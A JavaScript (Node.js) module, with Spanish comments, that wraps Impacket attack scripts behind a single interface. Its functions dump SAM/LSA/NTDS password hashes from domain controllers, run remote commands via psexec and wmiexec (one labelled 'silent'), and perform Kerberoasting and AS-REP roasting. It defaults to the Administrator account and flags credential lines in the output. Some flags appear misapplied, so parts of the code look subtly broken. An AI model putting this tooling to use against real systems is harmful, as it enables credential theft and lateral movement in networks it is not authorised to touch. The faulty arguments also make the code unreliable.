const { spawn } = require('child_process');

/**
 * Impacket Suite — Colección de herramientas Python para protocolos de red Windows.
 * Cada función corresponde a un script de Impacket.
 */

function _run(script, args, onLine, onDone) {
    onLine(`$ ${script} ${args.join(' ')}`);
    const proc = spawn(script, args, { shell: false });
    let buf = '';
    proc.stdout.on('data', d => {
        buf += d.toString();
        const ls = buf.split('\n'); buf = ls.pop();
        ls.forEach(l => {
            if (!l.trim()) return;
            let line = l;
            if (/hash|NTLM|password/i.test(l))  line = `[CRED] ${l}`;
            if (/error|fail/i.test(l))            line = `[ERR] ${l}`;
            onLine(line);
        });
    });
    proc.stderr.on('data', d => d.toString().split('\n').forEach(l => l.trim() && onLine(l)));
    proc.on('close', code => { if (buf.trim()) onLine(buf); onLine(`\n[Impacket/${script}] Exit: ${code}`); onDone(code); });
    proc.on('error', err => { onLine(`[ERROR] ${err.message}`); onLine(`[HINT] pip install impacket`); onDone(1); });
}

function _creds(target, options) {
    const parts = [];
    const domain = options.domain || 'WORKGROUP';
    const user   = options.username || 'Administrator';
    const pass   = options.password || '';
    const hash   = options.hash || '';

    if (hash) return [`${domain}/${user}@${target}`, '-hashes', `:${hash}`];
    return [`${domain}/${user}:${pass}@${target}`];
}

/** secretsdump — Dump de hashes SAM, LSA, NTDS */
function secretsdump(target, options, onLine, onDone) {
    const args = [..._creds(target, options)];
    if (options.ntds)    args.push('-use-vss');  // vía VSS para NTDS
    if (options.outputFile) args.push('-outputfile', options.outputFile);
    args.push('-just-dc-ntlm');  // solo hashes NTLM del DC por defecto
    _run('secretsdump.py', args, onLine, onDone);
}

/** psexec — Ejecución remota de comandos via SMB */
function psexec(target, command, options, onLine, onDone) {
    const args = [..._creds(target, options), '-c', command || 'cmd.exe /c whoami'];
    _run('psexec.py', args, onLine, onDone);
}

/** wmiexec — Ejecución via WMI (menos ruidoso) */
function wmiexec(target, command, options, onLine, onDone) {
    const args = [..._creds(target, options)];
    if (command) args.push('-exec-method', 'smbexec', command);
    _run('wmiexec.py', args, onLine, onDone);
}

/** GetUserSPNs — Kerberoasting */
function getUserSPNs(target, options, onLine, onDone) {
    const domain = options.domain || 'corp.local';
    const user   = options.username || '';
    const pass   = options.password || '';
    const hash   = options.hash || '';
    const args = [`${domain}/${user}`, '-dc-ip', target, '-request'];
    if (hash) args.push('-hashes', `:${hash}`);
    else args.push('-p', pass);
    if (options.outputFile) args.push('-output', options.outputFile);
    _run('GetUserSPNs.py', args, onLine, onDone);
}

/** GetNPUsers — AS-REP Roasting */
function getNPUsers(target, options, onLine, onDone) {
    const domain = options.domain || 'corp.local';
    const user   = options.username || '';
    const args = [`${domain}/`, '-dc-ip', target, '-request', '-no-pass'];
    if (user) args.push('-usersfile', user);  // user puede ser fichero de usuarios
    if (options.format) args.push('-format', options.format || 'hashcat');
    _run('GetNPUsers.py', args, onLine, onDone);
}

/** rpcdump — Enumeración de RPC endpoints */
function rpcdump(target, options, onLine, onDone) {
    _run('rpcdump.py', [target], onLine, onDone);
}

/** lookupsid — Enumeración de SIDs */
function lookupsid(target, options, onLine, onDone) {
    const args = [..._creds(target, options)];
    _run('lookupsid.py', args, onLine, onDone);
}

/** smbclient — Cliente SMB interactivo */
function smbclient(target, share, options, onLine, onDone) {
    const args = [..._creds(target, options)];
    if (share) args.push(share);
    _run('smbclient.py', args, onLine, onDone);
}

// Herramientas del suite disponibles
const tools = [
    { id: 'secretsdump', name: 'secretsdump.py', desc: 'Dump SAM/LSA/NTDS hashes remotamente', icon: '💀' },
    { id: 'psexec',      name: 'psexec.py',      desc: 'Shell remoto via SMB (como PsExec)', icon: '💻' },
    { id: 'wmiexec',     name: 'wmiexec.py',     desc: 'Ejecución remota via WMI (silencioso)', icon: '👻' },
    { id: 'getUserSPNs', name: 'GetUserSPNs.py',  desc: 'Kerberoasting — TGS tickets de service accounts', icon: '🎫' },
    { id: 'getNPUsers',  name: 'GetNPUsers.py',   desc: 'AS-REP Roasting — cuentas sin preauth', icon: '🔓' },
    { id: 'rpcdump',     name: 'rpcdump.py',      desc: 'Enumeración de endpoints RPC', icon: '📡' },
    { id: 'lookupsid',   name: 'lookupsid.py',    desc: 'Enumeración de SIDs del dominio', icon: '🔢' },
    { id: 'smbclient',   name: 'smbclient.py',    desc: 'Cliente SMB para navegación de shares', icon: '📂' },
];

module.exports = { secretsdump, psexec, wmiexec, getUserSPNs, getNPUsers, rpcdump, lookupsid, smbclient, tools };
